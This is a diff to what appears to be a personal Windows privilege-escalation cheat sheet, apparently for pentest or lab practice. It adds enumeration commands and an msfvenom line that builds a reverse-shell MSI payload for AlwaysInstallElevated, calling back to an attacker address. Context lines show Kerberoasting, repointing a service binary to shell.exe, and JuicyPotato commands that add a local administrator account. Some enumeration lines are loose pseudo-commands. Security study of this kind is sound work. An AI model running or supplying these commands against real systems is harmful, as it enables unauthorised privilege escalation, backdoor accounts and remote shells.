@@ -48,6 +48,24 @@ GetUsersSPNs.py 'domain.local/jan:password'
 
 # Windows Privilege Escalation Techniques
 
+## Windows Internal Enumeration
+
+```powershell
+# System Enumeration
+systeminfo
+windows version registry key print
+
+# Network Enumeration
+netstat -nat
+
+# User Enumeration
+whoami /priv, whoami/all
+net user <user>
+
+# Services Enumeration
+services
+```
+
 ## Abusing groups
 
 ### Server Operators
@@ -69,6 +87,14 @@ sc.exe config VMTools binpath="C:\Users\Janrdz\Desktop\shell.exe"
 JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net user jan jan /add" -l 1337
 JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators jan /add" -l 1337
 JP.exe -t * -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 1337
+```
+
+### AlwaysInstallElevated
+
+Create a payload.msi with MSFVenom (Reverse Shell)
+
+```powershell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 --platform windows -a x64 -f msi -o reverse.msi
 ```
 
 ------------------------------------------------------------------------------------------------------
